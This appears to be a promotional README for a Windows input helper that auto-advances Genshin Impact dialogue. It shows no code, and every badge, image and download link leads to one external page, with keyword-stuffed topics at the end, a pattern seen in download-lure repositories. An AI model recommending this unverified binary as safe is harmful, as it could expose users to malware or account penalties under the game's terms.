# 🌙 Genshin Impact Story Advance Assistant — Dialogue & Auto-Play Helper

**Genshin Impact Story Advance Assistant** is a desktop convenience tool for players who want less repetitive clicking during long dialogue sequences.

It is presented as an **external input helper**, not a game modification: no game-file editing, no DLL injection, no memory reading/writing, and no process hooks. The safest workflow keeps the player present and uses manual hold-to-advance controls rather than unattended automation.

> **Policy note:** HoYoverse rules can restrict third-party software and automation. External input assistance may still carry account-policy risk even if it does not alter game files or inject into the game process. Review the current Genshin Impact / HoYoverse Terms of Service before using any third-party utility.

---

## Quick Access

[![Genshin Impact](https://img.shields.io/badge/Genshin%20Impact-Story%20Helper-579fe8?style=for-the-badge)](https://idleobstacle.github.io/)
[![Dialogue](https://img.shields.io/badge/Dialogue-Helper-6aaedf?style=for-the-badge)](https://idleobstacle.github.io/)
[![Auto Play](https://img.shields.io/badge/Auto--Play-Assist-8a72d4?style=for-the-badge)](https://idleobstacle.github.io/)
[![External](https://img.shields.io/badge/External-No%20Injection-44a66d?style=for-the-badge)](https://idleobstacle.github.io/)
[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://idleobstacle.github.io/)
[![Download](https://img.shields.io/badge/Download-Latest%20Version-1f883d?style=for-the-badge)](https://idleobstacle.github.io/)

---

## Download

➡️ **[Download Genshin Impact Story Helper](https://idleobstacle.github.io/)**

---

## Preview

[![Genshin Impact story helper preview](assets/genshin-story-helper-preview.png)](https://idleobstacle.github.io/)

### Dialogue Helper UI

[![Genshin Impact dialogue helper UI](assets/genshin-dialogue-helper-ui.png)](https://idleobstacle.github.io/)

### External Helper Architecture

![External desktop helper architecture](assets/genshin-external-helper-architecture.png)

> Visuals are interface mockups. They illustrate the intended desktop-helper workflow rather than an official HoYoverse feature.

---

## What The Helper Is Designed To Do

### 💬 Dialogue Advance

Use a configurable manual control to progress dialogue that already responds to normal keyboard/mouse input.

Suggested modes:

```text
Manual Press
Hold-to-Advance
Pause
Resume
```

The user remains in control of the session.

### ▶️ Auto-Play Story Assistance

Genshin Impact includes an **Auto-Play Story** option for dialogue.

The helper can be positioned as a convenience layer around that existing behavior:

- start / stop helper controls;
- pause when manual interaction is needed;
- manual resume;
- keep a clear indicator when the helper is active.

### ❓ Pause on Dialogue Choices

When the player must choose a dialogue response, the helper should stop and wait.

This avoids silently selecting story choices for the user.

### ⌨️ Configurable Hotkeys

Example desktop controls:

```text
Start / Resume
Pause
Hold-to-Advance
Emergency Stop
```

Keep the hotkeys easy to disable at any time.

---

## What It Does NOT Do

For transparency, this repository does not describe or advertise:

- game-file modification;
- DLL injection;
- process hooking;
- memory scanning;
- memory editing;
- protection-system bypass;
- forced skipping of scenes the game does not expose as skippable;
- unattended gameplay.

The project is positioned as an **external desktop convenience helper**.

---

## Important Limitation: "Skip" vs "Advance"

Not every Genshin Impact scene can be skipped with a normal input.

Therefore:

**Dialogue Advance**
: The game already allows the player to continue to the next line.

**Auto-Play**
: The game's built-in story option advances dialogue automatically where supported.

**True Cutscene Skip**
: Only available where Genshin Impact itself provides an appropriate skip/fast-forward behavior.

The helper does not claim to create a hidden skip feature.

---

## Recommended Safe-Use Design

```text
Player starts helper manually
↓
Helper provides external input convenience
↓
Dialogue progresses only where input is accepted
↓
Player choice appears
↓
Helper pauses
↓
Player makes the choice
↓
Player manually resumes
```

This is preferable to unattended automation.

---

## Installation

1. Download the current build:

   **[Download Genshin Impact Story Helper](https://idleobstacle.github.io/)**

2. Extract it into a normal desktop folder.
3. Do **not** place files inside the Genshin Impact installation directory.
4. Start Genshin Impact normally through HoYoPlay.
5. Start the helper separately.
6. Configure your manual hotkeys.
7. Test only on dialogue where normal input already advances the text.

---

## Usage

### Example Configuration

```text
Mode:              Hold-to-Advance
Auto-Play Assist:  Optional
Choice Pause:      Enabled
Manual Resume:     Enabled
Game File Access:  None
Process Injection: None
Memory Access:     None
```

### Recommended Workflow

1. Open Genshin Impact normally.
2. Enter a story dialogue.
3. Enable the helper manually.
4. Hold the configured advance key when you want to move faster.
5. Release or pause at any time.
6. Make dialogue choices yourself.
7. Resume manually after a choice.

---

## FAQ

### Does this modify Genshin Impact files?

No file modification is part of the described design.

### Does it inject a DLL into the game?

No.

### Does it read or edit game memory?

No.

### Can it instantly skip every cinematic?

No. Scenes that do not support a normal skip action cannot honestly be presented as instantly skippable by an external helper that does not modify or hook the client.

### Why call it a "skip helper" then?

Because the common user goal is to move through dialogue faster. The README distinguishes **dialogue advance** from a true forced cutscene skip.

### Can third-party input helpers violate the Terms of Service?

Potentially. HoYoverse policies can restrict third-party software and automation, so users should check the current rules before use.

---

## Project Information

```text
Project: Genshin Impact Story Helper
Game: Genshin Impact
Platform: Windows
Mode: External desktop helper
Focus: Auto-Play assistance / hold-to-advance
Game File Modification: None
Process Injection: None
Memory Access: None
```

---

## Disclaimer

This is an independent community project and is not affiliated with, endorsed by, or sponsored by **HoYoverse / COGNOSPHERE**.

Genshin Impact is a live-service game. Third-party tools may be restricted by current service rules even when they do not modify game files. Use caution and review the current Terms of Service before using any external helper.

---

<details>
<summary>🔎 Genshin Impact Story Helper — Related Topics</summary>

<br>

**Genshin Impact Dialogue Helper** • Genshin Impact Story Helper • Genshin Impact Cutscene Helper • Dialogue Advance • Story Progress • Auto-Play Story • Hold-to-Advance • Pause on Choice • External Desktop Helper • Quality of Life • Windows Utility

</details>
